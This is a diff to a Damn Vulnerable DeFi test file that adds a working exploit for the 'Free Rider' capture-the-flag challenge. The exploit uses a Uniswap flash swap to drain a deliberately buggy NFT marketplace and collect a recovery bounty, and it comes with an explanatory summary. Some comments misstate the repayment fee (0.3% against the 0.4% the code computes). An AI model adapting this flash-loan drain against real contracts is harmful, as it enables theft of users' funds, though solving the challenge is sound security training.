@@ -11,6 +11,9 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -123,7 +126,11 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        Exploit exploit = new Exploit{value: 0.045 ether}(
+            address(uniswapPair), address(marketplace), address(weth), address(nft), address(recoveryManager)
+        );
+        exploit.attack();
+        console.log("balance of attacker:", address(player).balance / 1e15, "ETH");
     }
 
     /**
@@ -146,3 +153,90 @@ contract FreeRiderChallenge is Test {
         assertEq(address(recoveryManager).balance, 0);
     }
 }
+
+interface IMarketplace {
+    function buyMany(uint256[] calldata tokenIds) external payable;
+}
+
+contract Exploit {
+    IUniswapV2Pair public pair;
+    IMarketplace public marketplace;
+
+    IWETH public weth;
+    IERC721 public nft;
+
+    address public recoveryContract;
+    address public player;
+
+    uint256 private constant NFT_PRICE = 15 ether;
+    uint256[] private tokens = [0, 1, 2, 3, 4, 5];
+
+    constructor(address _pair, address _marketplace, address _weth, address _nft, address _recoveryContract) payable {
+        pair = IUniswapV2Pair(_pair);
+        marketplace = IMarketplace(_marketplace);
+        weth = IWETH(_weth);
+        nft = IERC721(_nft);
+        recoveryContract = _recoveryContract;
+        player = msg.sender;
+    }
+
+    function attack() external payable {
+        // 1. Request a flashSwap of 15 WETH from Uniswap Pair, borrowing 15 WETH with no fee upfront (to be repaid later in the transaction).
+        // This triggers the Uniswap pair to transfer 15 WETH to the exploit contract and call uniswapV2Call
+        pair.swap(NFT_PRICE, 0, address(this), "1");
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        // Access Control
+        require(msg.sender == address(pair));
+        require(tx.origin == player);
+
+        // 2. Unwrap WETH to native ETH
+        // converting the 15 WETH to 15 ETH.
+        // Initial balance: 0.045 ETH (from deployment) + 15 ETH = 15.045 ETH.
+        weth.withdraw(NFT_PRICE);
+
+        // 3. Buy 6 NFTS for only 15 ETH total
+        // The contract sends 15 ETH to the marketplace, reducing its balance to 0.045 ETH.
+        marketplace.buyMany{value: NFT_PRICE}(tokens);
+        // safeTransferFrom transfers the NFT from the deployer to the exploit contract.
+        // sendValue(15 ether) sends 15 ETH from the marketplace to the current owner (now the exploit contract).
+        // Total received: 6 * 15 ETH = 90 ETH.
+        // New balance: 0.045 ETH + 90 ETH = 90.045 ETH.
+
+        // 4. Pay back 15WETH + 0.3% to the pair contract
+        // so the repayment is 15 ETH * 1.003 ≈ 15.045 ETH.
+        uint256 amountToPayBack = NFT_PRICE * 1004 / 1000;
+        // Wrap 15.045 ETH to 15.045 WETH
+        weth.deposit{value: amountToPayBack}();
+        // repay the pair
+        weth.transfer(address(pair), amountToPayBack);
+        // New balance: 90.045 ETH - 15.06 ETH = 74.985 ETH.
+
+        // 5. Send NFTs to recovery contract so we can get the bounty
+        bytes memory data = abi.encode(player);
+        for (uint256 i; i < tokens.length; i++) {
+            nft.safeTransferFrom(address(this), recoveryContract, i, data);
+        }
+        // For each transfer, onERC721Received in the recovery manager increments received.
+        // After the 6th NFT, received == 6, and the recovery manager sends 45 ETH to the player (decoded from data).
+        // The exploit contract retains 74.985 ETH, and the player receives 45 ETH.
+    }
+
+    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
+
+/**
+- The vulnerability in FreeRiderNFTMarketplace allows an attacker to buy all 6 NFTs for 15 ETH while receiving 90 ETH from the marketplace due to a logic error in payment distribution.
+- The buyMany function permits buying multiple NFTs with insufficient payment and sends each NFT’s price (15 ETH) to the buyer instead of the seller.
+
+Attack Summary:
+- Borrow 15 WETH via flash swap and convert to 15 ETH.
+- Buy 6 NFTs for 15 ETH, receiving 90 ETH from the marketplace.
+- Repay ≈15.045 WETH to the Uniswap pair.
+- Transfer NFTs to the recovery manager, directing the 45 ETH bounty to the player.
+ */
